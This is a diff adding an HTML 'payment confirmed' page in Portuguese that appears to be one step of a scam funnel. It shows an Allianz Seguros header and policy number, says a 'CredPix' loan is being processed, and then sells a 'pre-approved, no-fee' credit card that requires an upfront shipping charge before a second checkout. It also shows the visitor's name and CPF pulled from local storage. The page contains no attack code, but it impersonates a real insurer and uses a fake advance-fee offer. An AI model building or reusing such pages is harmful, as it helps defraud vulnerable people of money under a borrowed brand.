@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="pt-BR">
+<head><!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-59CWZV26');</script>
+<!-- End Google Tag Manager -->
+<script>
+window.dataLayer = window.dataLayer || [];
+dataLayer.push({
+  'transactionId': localStorage.getItem('transactionId') || 'txn_main',
+  'transactionTotal': 29.86
+});
+</script>
+
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Pagamento Confirmado – CredPix</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f0f4fa; min-height: 100dvh; display: flex; flex-direction: column; }
+
+    .m2-header { background: linear-gradient(135deg, #003781 0%, #0054b4 100%); padding: 24px 24px 28px; }
+    .m2-header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 18px; }
+    .m2-brand { font-size: 18px; font-weight: 900; color: #fff; }
+    .m2-policy-label { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; }
+    .m2-policy-num { font-size: 16px; font-weight: 800; color: #93c5fd; }
+    .m2-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; background: rgba(255,255,255,0.06); border-radius: 12px; padding: 14px 16px; }
+    .m2-info-label { font-size: 10px; color: rgba(255,255,255,0.35); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 4px; }
+    .m2-info-value { font-size: 14px; font-weight: 700; color: #fff; }
+
+    .content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 36px 16px 48px; }
+
+    .check-icon { width: 88px; height: 88px; background: #059669; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; box-shadow: 0 4px 20px rgba(5,150,105,0.3); }
+    .check-icon svg { width: 48px; height: 48px; stroke: #fff; }
+
+    .title { font-size: 24px; font-weight: 800; color: #0f172a; text-align: center; margin-bottom: 8px; }
+    .subtitle { font-size: 14px; color: #64748b; text-align: center; line-height: 1.5; margin-bottom: 28px; }
+
+    .divider { width: 100%; max-width: 440px; border: none; border-top: 1px solid #e2e8f0; margin-bottom: 24px; }
+
+    .upsell-card { background: #fff; border-radius: 16px; width: 100%; max-width: 440px; padding: 24px 20px; box-shadow: 0 2px 16px rgba(0,55,129,0.08); }
+    .upsell-badge { display: inline-block; background: #003781; color: #fff; font-size: 11px; font-weight: 700; letter-spacing: 0.5px; padding: 4px 12px; border-radius: 999px; margin-bottom: 14px; }
+    .upsell-title { font-size: 17px; font-weight: 800; color: #0f172a; margin-bottom: 8px; }
+    .upsell-text { font-size: 14px; color: #64748b; line-height: 1.5; margin-bottom: 20px; }
+
+    .card-iframe-wrap { width: 100%; border-radius: 12px; overflow: hidden; margin-bottom: 20px; }
+    .card-iframe-wrap iframe { width: 100%; height: 260px; border: none; display: block; }
+
+    .frete-btns { display: flex; flex-direction: column; gap: 12px; }
+    .badge-popular { display: inline-block; background: #1351b4; color: #fff; font-size: 10px; font-weight: 700; letter-spacing: 0.5px; padding: 3px 10px; border-radius: 999px; margin-bottom: 8px; }
+    .frete-btn { width: 100%; border: none; border-radius: 14px; padding: 16px 18px; cursor: pointer; text-align: left; transition: opacity 0.15s, transform 0.15s; }
+    .frete-btn:active { opacity: 0.85; transform: scale(0.98); }
+    .frete-btn-title { font-size: 15px; font-weight: 700; line-height: 1; }
+    .frete-btn-sub { font-size: 12px; margin-top: 5px; }
+    .frete-normal { background: #fff; border: 2px solid #003781; }
+    .frete-normal .frete-btn-title { color: #003781; }
+    .frete-normal .frete-btn-sub { color: #94a3b8; }
+    .frete-expresso { background: #003781; border: 2px solid #003781; }
+    .frete-expresso .frete-btn-title { color: #fff; }
+    .frete-expresso .frete-btn-sub { color: rgba(255,255,255,0.75); }
+  </style>
+</head>
+<body>
+
+
+<div class="m2-header">
+    <div class="m2-header-top">
+        <div class="m2-brand">Allianz Seguros</div>
+        <div style="text-align:right;">
+            <div class="m2-policy-label">APOLICE</div>
+            <div class="m2-policy-num">#ALZ-1429</div>
+        </div>
+    </div>
+    <div class="m2-info-grid">
+        <div><div class="m2-info-label">Segurado</div><div class="m2-info-value" id="leadNome">Carregando...</div></div>
+        <div><div class="m2-info-label">CPF</div><div class="m2-info-value" id="leadCpf">***.***.***-**</div></div>
+    </div>
+</div>
+<script>
+(function() {
+  var nome = localStorage.getItem('nomeUsuario') || '';
+  var cpf = localStorage.getItem('cpfUsuario') || '';
+  var leadNomeEl = document.getElementById('leadNome');
+  var leadCpfEl = document.getElementById('leadCpf');
+  if (leadNomeEl && nome) {
+    var parts = nome.trim().split(/\s+/);
+    leadNomeEl.textContent = parts.length > 1 ? parts[0] + ' ' + parts[parts.length-1] : nome;
+  }
+  if (leadCpfEl && cpf) {
+    var d = cpf.replace(/\D/g,'');
+    if (d.length === 11) leadCpfEl.textContent = '***.' + d.slice(3,6) + '.' + d.slice(6,9) + '-**';
+  }
+})();
+</script>
+
+<div class="content">
+
+  <div class="check-icon">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="20 6 9 17 4 12"></polyline>
+    </svg>
+  </div>
+
+  <div class="title">Pagamento Confirmado!</div>
+  <div class="subtitle">Seu empréstimo está sendo processado.</div>
+
+  <hr class="divider" />
+
+  <div class="upsell-card">
+    <div class="upsell-badge">OFERTA EXCLUSIVA</div>
+    <div class="upsell-title">Oferta exclusiva para você!</div>
+    <div class="upsell-text">Adquira seu Cartão CredPix Gold com limite pré-aprovado. Sem anuidade.</div>
+
+    <div class="card-iframe-wrap">
+      <iframe src="cartao-preview.html" scrolling="no" title="Cartão CredPix Gold"></iframe>
+    </div>
+
+    <div class="frete-btns">
+      <button class="frete-btn frete-expresso" onclick="escolherFrete('expresso')">
+        <div class="badge-popular">MAIS POPULAR</div>
+        <div class="frete-btn-title">Frete Expresso — R$ 24,90</div>
+        <div class="frete-btn-sub">Receba em até 3 dias úteis</div>
+      </button>
+      <button class="frete-btn frete-normal" onclick="escolherFrete('normal')">
+        <div class="frete-btn-title">Frete Normal — R$ 19,90</div>
+        <div class="frete-btn-sub">Receba em 7 a 15 dias úteis</div>
+      </button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+function escolherFrete(tipo) {
+  localStorage.setItem('tipo_frete_cartao', tipo);
+  window.location.href = '/pay/checkout2.html';
+}
+</script><!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-59CWZV26"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+</body>
+</html>
